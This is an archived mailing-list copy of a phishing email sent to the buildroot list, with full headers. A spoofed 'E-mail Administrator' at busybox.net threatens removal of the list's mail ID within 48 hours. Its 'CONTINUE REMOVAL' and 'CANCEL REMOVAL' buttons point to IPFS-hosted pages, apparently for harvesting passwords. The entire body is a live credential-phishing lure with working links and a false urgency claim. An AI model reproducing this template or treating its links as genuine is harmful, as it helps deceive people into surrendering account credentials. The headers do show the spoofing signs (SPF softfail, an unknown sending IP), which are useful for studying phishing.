Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 0FAFAC54E5D
	for <buildroot@archiver.kernel.org>; Fri, 15 Mar 2024 02:14:20 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp1.osuosl.org (Postfix) with ESMTP id 6AF798214F;
	Fri, 15 Mar 2024 02:14:20 +0000 (UTC)
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
	by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
	with ESMTP id 4iaohthpE6Fe; Fri, 15 Mar 2024 02:14:19 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 8D22282152
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp1.osuosl.org (Postfix) with ESMTP id 8D22282152;
	Fri, 15 Mar 2024 02:14:19 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 0B0741BF3AD
 for <buildroot@lists.busybox.net>; Fri, 15 Mar 2024 02:14:18 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 76DEB82170
 for <buildroot@lists.busybox.net>; Fri, 15 Mar 2024 02:14:16 +0000 (UTC)
X-Virus-Scanned: amavisd-new at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavisd-new, port 10024)
 with ESMTP id DzAfK3BHIXpx for <buildroot@lists.busybox.net>;
 Fri, 15 Mar 2024 02:14:15 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=194.48.251.26;
 helo=[194.48.251.26]; envelope-from=noreplysdesk@busybox.net;
 receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B5D978214F
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B5D978214F
Received: from [194.48.251.26] (unknown [194.48.251.26])
 by smtp1.osuosl.org (Postfix) with ESMTP id B5D978214F
 for <buildroot@busybox.net>; Fri, 15 Mar 2024 02:14:14 +0000 (UTC)
From: E-mail Administrator <noreplysdesk@busybox.net>
To: buildroot@busybox.net
Date: 14 Mar 2024 19:14:13 -0700
Message-ID: <20240314191413.0A49CDE9B8E2ABF8@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot]
 =?UTF-8?B?4pqg77iPIEltcG9ydGFudCBOb3RpY2U6IFNlY3VyZSBZb3VyIEFjY291bnQgLSBNYWlsIElEIFJlbW92YWwgQWxlcnQh?="!
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0730601732106033451=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============0730601732106033451==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<BODY>
<P> </P>
<DIV style=3D"FONT-SIZE: 18pt; MARGIN: 0.4em">
<DIV style=3D"BORDER-TOP: rgb(52,152,219) 3px solid; BORDER-RIGHT: rgb(52,1=
52,219) 3px solid; BORDER-BOTTOM: rgb(52,152,219) 3px solid; COLOR: rgb(44,=
54,58); PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 20px; BORDER=
-LEFT: rgb(52,152,219) 3px solid; DISPLAY: inline-block; PADDING-RIGHT: 20p=
x; BACKGROUND-COLOR: rgb(242,242,242)">
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Roboto,R=
obotoDraft,Helvetica,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; PADDING-BOTTOM: 10px; FONT-STYL=
E: normal; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px; LETTER-SPACI=
NG: normal; PADDING-RIGHT: 10px; BACKGROUND-COLOR: rgb(249,227,227); TEXT-I=
NDENT: 0px"><FONT size=3D6>REMOVAL OF MAIL ID</FONT> </P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Roboto,R=
obotoDraft,Helvetica,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; PADDING-BOTTOM: 10px; FONT-STYL=
E: normal; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px; LETTER-SPACI=
NG: normal; PADDING-RIGHT: 10px; BACKGROUND-COLOR: rgb(249,227,227); TEXT-I=
NDENT: 0px">ID : buildroot<BR><BR>Removal will occur in exactly 48 hours fr=
om 14, 03,2024<BR><BR>
Kindly verify your mail ID within 24 hours to secure your account </P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: small; FONT-FAMILY: Roboto,R=
obotoDraft,Helvetica,Arial,sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0=
px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; PADDING-BOTTOM: 10px; FONT-STYL=
E: normal; PADDING-TOP: 10px; PADDING-LEFT: 10px; MARGIN: 0px; LETTER-SPACI=
NG: normal; PADDING-RIGHT: 10px; BACKGROUND-COLOR: rgb(249,227,227); TEXT-I=
NDENT: 0px">Use the button below to continue with the same password </P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,sa=
ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
T-WEIGHT: 400; FONT-STYLE: normal; MARGIN: 10px 0px 0px; LETTER-SPACING: no=
rmal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
normal; text-decoration-style: initial; text-decoration-color: initial">
<A href=3D"https://fleek.ipfs.io/ipfs/QmV1tpRy1jeTKqUK9sc7DBBuXpkCDfkJwFz65=
GaH1HUJ7m/krfging.html#buildroot@busybox.net" rel=3Dnoreferrer target=3D_bl=
ank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://fleek.ip=
fs.io/ipfs/QmedDEUzb3wNm6Jev64YUKsbv6Ks2WYtsVpxsD2z7NjkHW?filename%3Dbackgr=
oud.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D171045537675600=
0&amp;usg=3DAOvVaw0Tre-7IN307kcT9NhJNQTX">CONTINUE REMOVAL</A>
 <A href=3D"https://fleek.ipfs.io/ipfs/QmedDEUzb3wNm6Jev64YUKsbv6Ks2WYtsVpx=
sD2z7NjkHW?filename=3Dbackgroud.html#buildroot@busybox.net" rel=3Dnoreferre=
r target=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dht=
tps://fleek.ipfs.io/ipfs/QmedDEUzb3wNm6Jev64YUKsbv6Ks2WYtsVpxsD2z7NjkHW?fil=
ename%3Dbackgroud.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1=
710455376756000&amp;usg=3DAOvVaw0Tre-7IN307kcT9NhJNQTX">CANCEL REMOVAL</A> =
</P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,sa=
ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
T-WEIGHT: 400; FONT-STYLE: normal; MARGIN: 10px 0px 0px; LETTER-SPACING: no=
rmal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
normal; text-decoration-style: initial; text-decoration-color: initial">&co=
py; 2024&nbsp; buildroot@busybox.net </P>
<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; FONT-FAMILY: Roboto,sa=
ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
T-WEIGHT: 400; FONT-STYLE: normal; MARGIN: 10px 0px 0px; LETTER-SPACING: no=
rmal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: =
normal; text-decoration-style: initial; text-decoration-color: initial">&gt=
;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; Please do not reply to this message. =
&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; </P></DIV>
</DIV></BODY></HTML>

--===============0730601732106033451==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============0730601732106033451==--
